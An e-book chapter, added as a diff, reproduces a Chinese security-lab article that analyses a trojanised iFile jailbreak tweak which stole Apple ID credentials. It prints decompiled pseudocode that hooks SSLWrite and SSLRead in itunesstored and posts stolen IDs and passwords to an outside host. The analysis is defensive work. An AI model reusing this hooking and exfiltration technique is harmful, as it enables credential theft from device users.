@@ -1,0 +1,184 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>越狱插件盗取22万个苹果账号样本分析</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>越狱插件盗取22万个苹果账号样本分析</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI2MDA0MTYyMQ==&amp;mid=210357098&amp;idx=2&amp;sn=df3f14ef2ac6fa6469ceb2928619756f&amp;chksm=6312d59054655c8619ca99e05650b6a5a9ee7d52ae396b58980591fcd08a183d0778bc692832&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzI2MDA0MTYyMQ==&amp;mid=210357098&amp;idx=2&amp;sn=df3f14ef2ac6fa6469ceb2928619756f&amp;chksm=6312d59054655c8619ca99e05650b6a5a9ee7d52ae396b58980591fcd08a183d0778bc692832&amp;scene=27#wechat_redirect</a></blockquote><h3 style=""><strong style="padding: 0px; margin: 0px;">盗号事件</strong></h3><p style="">最近乌云爆出某些越狱插件盗取22万个苹果账号的事件，如果曾经安装过不明源里的插件，建议用户立刻修改密码。</p><p style=""><br/></p><h3 style=""><strong style="padding: 0px; margin: 0px;">样本分析</strong></h3><p style="">下文将分析获取的一个盗号插件样本，该盗号木马将自己捆绑到知名的iFile越狱插件中以达到安装执行的目的。解开deb可以看到跟原版的iFile相比多了一个基于Substrate框架的插件：</p><p style=""><br/></p><pre style=""><code style=""><span style="font-size: 12px;">$ ls iFile_2.2.0-2-2/data/Library/MobileSubstrate/DynamicLibraries/
+iFile.dylib iFile.plist</span></code></pre><p style=""><br/></p><p style="">查看iFile.plist发现iFile.dylib模块被注入了itunesstored这个关键服务：</p><p style=""><br/></p><pre style=""><code style=""><span style="font-size: 12px;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+    &lt;key&gt;Filter&lt;/key&gt;
+    &lt;dict&gt;
+        &lt;key&gt;Executables&lt;/key&gt;
+        &lt;array&gt;
+            &lt;string&gt;MobileSafari&lt;/string&gt;
+            &lt;string&gt;assertiond&lt;/string&gt;
+            &lt;string&gt;SpringBoard&lt;/string&gt;
+            &lt;string&gt;itunesstored&lt;/string&gt;
+        &lt;/array&gt;
+    &lt;/dict&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;</span></code></pre><p style=""><br/></p><p style="">使用IDA分析iFile.dylib，hookaid方法调用MSHookFunction函数hook了”/System/Library/Frameworks/Security.framework/Security”框架的SSLWrite和SSLRead函数。</p><p style=""><br/></p><p style=""><span style="padding: 0px; margin: 0px;"/></p><pre style=""><code style=""><span style="font-size: 12px;">int __fastcall hookaid(int a1)
+{
+  ...
+  NSLog(CFSTR("\n\n\n\n\n\n\n\n====================aid==========\n\n\n\n\n\n\n"));
+  g_aid_from = v6;
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::__init(
+    &amp;v18,
+    "/System/Library/Frameworks/Security.framework/Security",
+    54);
+  v21 = &amp;__gxx_personality_sj0;
+  v22 = &amp;GCC_except_table7_0;
+  v23 = &amp;savedregs;
+  v25 = &amp;v13;
+  v24 = ((unsigned int)&amp;stru_DC.sectname[8] | 1) + 40728;
+  v20 = 1;
+  _Unwind_SjLj_Register(&amp;v19);
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::__init(&amp;v17, "SSLWrite", 8);
+  v20 = 2;
+  v14 = getAdress(&amp;v18, &amp;v17);
+  v20 = 3;
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v17);
+  v20 = -1;
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v18);
+  if ( v14 )
+  {
+    v20 = -1;
+    MSHookFunction(v14, (int)aid_r_SSLWrite, (int)&amp;aid_o_SSLWrite, v7);
+  }
+  v20 = -1;
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::__init(
+    &amp;v16,
+    "/System/Library/Frameworks/Security.framework/Security",
+    54);
+  v20 = 6;
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::__init(&amp;v15, "SSLRead", 7);
+  v20 = 7;
+  v14 = getAdress(&amp;v16, &amp;v15);
+  v20 = 8;
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v15);
+  v20 = -1;
+  std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v16);
+  if ( v14 )
+  {
+    v20 = -1;
+    MSHookFunction(v14, (int)aid_r_SSLRead, (int)&amp;aid_o_SSLRead, v8);
+  }
+  ...
+}</span></code></pre><p style=""><br/></p><p style="">当用户输入AppleID和密码登陆账号时，itunesstored服务会通过SSL连接向苹果服务器验证。因此在SSLWrite函数中可以拦截到明文的ID和密码，而在SSLRead中可以通过服务器返回的数据判断登陆是否成功，一旦登陆成功就将记录的ID和密码回传到服务器。</p><p style=""><br/></p><p style="">通过调试手段可以确认在SSLWrite中能获取ID和明文密码：</p><p style=""><br/></p><p style=""><img data-s="300,640" data-type="png" data-src="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIhdmAibepBnuKzccVMxk6glZibeDiaISn5KwDOzBTt42mNTQw4wyDxPdXEC1GjzJuMErH3QSmxIXOgNg/0?wx_fmt=png" data-ratio="0.3577075098814229" data-w="" src="../Images/8152cff4f3aefebed9e93250c0eef75c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIhdmAibepBnuKzccVMxk6glZibeDiaISn5KwDOzBTt42mNTQw4wyDxPdXEC1GjzJuMErH3QSmxIXOgNg/0?wx_fmt=png"/><br/></p><p style=""><br/></p><p style="">可以在输出中看到我们测试输入的账号信息：</p><ul style="" class=" list-paddingleft-2"><li><p>appleId=test@pangu.io</p></li><li><p>password=123456789</p></li></ul><p><br/></p><p style="">实际解析ID和密码并记录是在 aid_r_SSLWrite -&gt; parsexml 函数中，而实际回传盗取的数据是在 aid_r_SSLRead -&gt; sendAid 函数中：</p><p style=""><br/></p><pre style=""><code style=""><span style="font-size: 12px;">void *sendAid(void)
+{
+  ...
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::basic_string(&amp;v45, &amp;g_aid_name);
+    v51 = 2;
+    meEncry(&amp;v46, &amp;v45);
+    v51 = 3;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v45);
+    v51 = 4;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v33, &amp;v47, "id=");
+    v51 = 5;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v34, &amp;v33, &amp;v46);
+    v51 = 6;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v35, &amp;v34, "&amp;name=");
+    v51 = 7;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v36, &amp;v35, &amp;v46);
+    v51 = 8;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v37, &amp;v36, "&amp;pass=");
+    v51 = 9;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::basic_string(&amp;v31, &amp;g_aid_pass);
+    v51 = 10;
+    meEncry(&amp;v32, &amp;v31);
+    v51 = 11;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v38, &amp;v37, &amp;v32);
+    v51 = 12;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v39, &amp;v38, "&amp;guid=");
+    v51 = 13;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v40, &amp;v39, &amp;g_aid_guid);
+    v51 = 14;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v41, &amp;v40, "&amp;from=");
+    v51 = 15;
+    getYinwen(&amp;v30, g_aid_from);
+    v51 = 16;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v42, &amp;v41, &amp;v30);
+    v51 = 17;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v43, &amp;v42, "&amp;xp_ci=");
+    v51 = 18;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(&amp;v44, &amp;v43, &amp;g_aid_xp_ci);
+    v51 = 19;
+    ...
+    v51 = 35;
+    NSLog(CFSTR("g_from:%@ url:%s"));
+    v28 = 0;
+    v27 = 0;
+    v29 = 0;
+    v51 = 36;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(
+      &amp;v23,
+      &amp;v27,
+      "POST /aid.php HTTP/1.1\r\n");
+    v51 = 37;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(
+      &amp;v24,
+      &amp;v23,
+      "Host: www.wushidou.cn\r\n");
+    v51 = 38;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(
+      &amp;v25,
+      &amp;v24,
+      "Content-Type: application/x-www-form-urlencoded\r\n");
+    v51 = 39;
+    std::__1::operator+&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;(
+      &amp;v26,
+      &amp;v25,
+      "Content-Length: (length)\r\n\r\n");
+    v51 = 40;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::operator=(&amp;v27, &amp;v26);
+    v51 = 41;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v26);
+    v51 = 42;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v25);
+    v51 = 43;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v24);
+    v51 = 44;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v23);
+    v51 = 45;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::__init(&amp;v22, "(length)", 8);
+    if ( v47 &amp; 1 )
+      v9 = v48;
+    else
+      v9 = (unsigned int)(unsigned __int8)v47 &gt;&gt; 1;
+    v51 = 46;
+    replaceRegexInt(&amp;v27, &amp;v22, v9);
+    v51 = 47;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::~basic_string(&amp;v22);
+    if ( v47 &amp; 1 )
+    {
+      v10 = v48;
+      v11 = v49;
+    }
+    else
+    {
+      v10 = (unsigned int)(unsigned __int8)v47 &gt;&gt; 1;
+      v11 = (unsigned int)&amp;v47 | 1;
+    }
+    v51 = 48;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::append(&amp;v27, v11, v10);
+    v21 = 0;
+    v51 = 49;
+    std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::__init(
+      &amp;v20,
+      "www.wushidou.cn",
+      15);
+    v51 = 50;
+    v17 = (void *)Http::init(&amp;v21, &amp;v20);
+  ...
+}</span></code></pre><p style=""><br/></p><p style="">值得注意的是回传过程中会有一个”from”标记，应该是用于记录这个盗号数据的来源。而在我们拿到的这个样本中 g_aid_from=”bamu”，应该是代表刀八木源中的插件。</p><p style=""><br/></p><h3 style=""><strong style="padding: 0px; margin: 0px;">后话</strong></h3><p style="">本次盗号事件再次让大家关心起越狱的安全问题。越狱为了让用户能完全控制自己的手机，势必打破了苹果原有的安全体系，从而降低了黑客开发盗号木马等的成本（对于非越狱的设备，通过利用漏洞的手段也是可以实现盗号木马等攻击，只是成本大大提高）。希望越狱用户在使用手机时，尽量在官方源下载原版插件。</p><p style=""><br/></p><p style="">文中分析的关键文件SHA1：</p><ul style="" class=" list-paddingleft-2"><li><p>623866a78ac17fab043a28e8dc6dc63b93f691a2 iFile_2.2.0-2-2.deb</p></li><li><p>c798d24673adcdfd1b31f1cf090766adbbe1622b iFile.dylib</p></li></ul><p><br/></p><section class="135editor" style="font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; color: rgb(62, 62, 62); line-height: 25.6px; border: 0px none; padding: 0px; box-sizing: border-box; margin: 0px;"><section style="margin: 96px 16px 16px; border: 1px solid rgb(159, 136, 127); text-align: center; border-radius: 8px; font-size: 18px; font-weight: inherit; text-decoration: inherit; box-sizing: border-box; padding: 0px;"><section style="margin-top: -3.3em; margin-right: auto; margin-left: auto; color: inherit; box-sizing: border-box; padding: 0px;"><img data-src="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIgbCoo6viasTySVCjgUkEGGVVvVvDm2hMkZZwVXCPhxxVf7BDcjAkI23x74zmBCRnHloyL7aoNakRA/0?wx_fmt=png" url="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIgbCoo6viasTySVCjgUkEGGVVvVvDm2hMkZZwVXCPhxxVf7BDcjAkI23x74zmBCRnHloyL7aoNakRA/0?wx_fmt=png" file_id="210256975" format="png" source="lib" data-type="png" data-s="300,640" data-ratio="1" data-w="108" width="108px" style="border-radius: 100%; border: 2px solid rgb(159, 136, 127); box-shadow: rgb(201, 201, 201) 0px 2px 2px 2px; color: inherit; width: 108px !important; visibility: visible !important; background-image: none; background-attachment: scroll; background-size: initial; background-origin: initial; background-clip: initial; background-position: 0% 0%; background-repeat: repeat;" src="../Images/1372d481b8ed26cd3ac25e3ab160427b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIgbCoo6viasTySVCjgUkEGGVVvVvDm2hMkZZwVXCPhxxVf7BDcjAkI23x74zmBCRnHloyL7aoNakRA/0?wx_fmt=png"/></section><section class="135brush" data-brushtype="text" data-style="text-align: left; font-size: 14px; color: inherit;" style="margin: 8px 15px; line-height: 1.4; color: inherit; box-sizing: border-box; padding: 0px;"><p style="text-align: left; font-size: 14px; color: inherit;"><span style="color: inherit; line-height: 1.4; font-weight: inherit; text-align: center; text-decoration: inherit;">本公众号是盘古实验室的官方公众号, 将会定期分享盘古实验室的技术分享以及最新的研究成果。</span><span style="color: inherit; line-height: 1.4; font-size: 18px; font-weight: inherit; text-align: center; text-decoration: inherit;"><br/></span></p><p style="text-align: left;"><span style="font-size: 14px;">识别下图二维码或者添加微信号: <span style="color: rgb(31, 73, 125);"/><strong><span style="color: rgb(31, 73, 125);">PanguLab</span></strong> 关注盘古实验室。</span></p><p style="text-align: left; font-size: 14px; color: inherit;"><br/></p></section><section style="margin: 10px 15px; border-top-width: 1px; border-top-style: solid; border-color: rgb(159, 136, 127); color: inherit; box-sizing: border-box; padding: 0px;"><p style="color: inherit;"><img data-src="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIgwgMtjpQV7YjeOpq2fb1JtJNicrZ5Kssf3PY8BHfRztoRkeO0U5ib0rk6U7aViaVnGqeDxV4wr5W5qw/0?wx_fmt=jpeg" url="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIgwgMtjpQV7YjeOpq2fb1JtJNicrZ5Kssf3PY8BHfRztoRkeO0U5ib0rk6U7aViaVnGqeDxV4wr5W5qw/0?wx_fmt=jpeg" file_id="210274785" format="jpeg" source="lib" data-type="jpeg" data-s="300,640" data-ratio="1" data-w="442" width="200px" style="margin-right: auto; margin-bottom: 0.3em; margin-left: auto; color: inherit; font-weight: inherit; line-height: inherit; text-decoration: inherit; width: 442px; visibility: visible !important;" src="../Images/346f90c481168585c1f9240bee64ac57.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/SxfwWH2vIIgwgMtjpQV7YjeOpq2fb1JtJNicrZ5Kssf3PY8BHfRztoRkeO0U5ib0rk6U7aViaVnGqeDxV4wr5W5qw/0?wx_fmt=jpeg"/></p></section></section></section><p style="font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal;"><br/></p><p><section class="135editor" style="font-family: 微软雅黑; white-space: normal; color: rgb(62, 62, 62); line-height: 25.6px; border: 0px none; padding: 0px; box-sizing: border-box; margin: 0px;"><section style="border: 0px; text-align: center; box-sizing: border-box; padding: 0px; margin: 0px;"><section style="display: inline-block; color: inherit; box-sizing: border-box; padding: 0px; margin: 0px;"><section style="font-size: 16.3636px; display: inline-block; color: inherit; box-sizing: border-box; padding: 0px; margin: 0px;"><p style="word-wrap: normal; color: inherit;"><strong style="color: inherit;">·END·</strong></p></section></section></section></section></p><p><br/></p>
+        
+</body>
+</html>
